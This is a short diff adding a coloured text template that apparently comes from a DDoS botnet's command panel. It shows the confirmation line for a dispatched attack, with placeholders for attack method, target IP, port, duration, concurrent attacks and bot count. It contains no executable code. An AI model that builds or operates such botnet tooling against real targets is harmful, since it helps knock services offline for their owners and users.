@@ -1,0 +1,3 @@
+{$resize.auto}  
+  <Skyline>Dispatched <Mango>{$method.sent}<Skyline>  →  Target: <Ibtesam>{$target.ip}<Skyline>  port: <Ibtesam>{$target.port}<Skyline>  time: <Ibtesam>{$target.time}s<Skyline>  concs: <Ibtesam>{$target.concs}  bots: <Reaqua>{$bots}
+
